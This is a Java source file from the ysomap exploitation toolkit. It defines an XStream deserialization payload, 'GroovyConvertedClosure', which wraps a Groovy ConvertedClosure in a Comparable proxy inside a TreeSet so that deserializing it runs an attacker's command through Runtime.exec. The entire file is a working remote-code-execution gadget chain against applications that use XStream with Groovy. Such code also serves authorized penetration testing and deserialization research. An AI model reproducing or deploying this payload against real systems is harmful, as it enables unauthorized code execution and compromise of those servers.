package ysomap.payloads.xstream;

import groovy.lang.Closure;
import org.codehaus.groovy.runtime.ConvertedClosure;
import ysomap.bullets.Bullet;
import ysomap.bullets.groovy.ClosureWithRuntime1Bullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;

import java.lang.reflect.Proxy;

/**
 * @author wh1t3P1g
 * @since 2020/4/18
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Targets({ Targets.XSTREAM })
@Authors({ Authors.WH1T3P1G })
@Dependencies({"org.codehaus.groovy:groovy:2.4.3"})
@Require(bullets = {"ClosureWithRuntimeBullet"}, param = false)
public class GroovyConvertedClosure extends XStreamPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return ClosureWithRuntime1Bullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        // 这条利用链 需要配合存在参数的函数调用，比如Runtime.exec(command)
        // 也可以扩展js引擎eval那种
        Object command = bullet.get("command");
        ConvertedClosure handler = new ConvertedClosure((Closure) obj, "compareTo");
        Object map = Proxy.newProxyInstance(
                GroovyConvertedClosure.class.getClassLoader(),
                new Class<?>[]{Comparable.class}, handler);
        return PayloadHelper.makeTreeSet(command, map);
    }
}
